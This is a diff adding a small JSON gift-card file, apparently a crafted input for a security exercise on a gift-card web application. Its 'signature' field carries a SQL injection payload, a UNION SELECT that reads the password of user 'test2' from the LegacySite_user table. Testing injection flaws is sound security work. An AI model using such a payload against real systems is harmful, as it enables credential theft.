@@ -1,0 +1,15 @@
+{
+  "merchant_id": "GiftCardz.com                   ",
+  "customer_id": "DuaneGreenes Store 1451         ",
+  "total_value": 2000,
+  "records": [
+    {
+      "record_type": "amount_change",
+      "amount_added": 2000,
+      "signature": "1' UNION SELECT password from LegacySite_user WHERE username= 'test2"
+    }
+  ]
+}
+
+
+
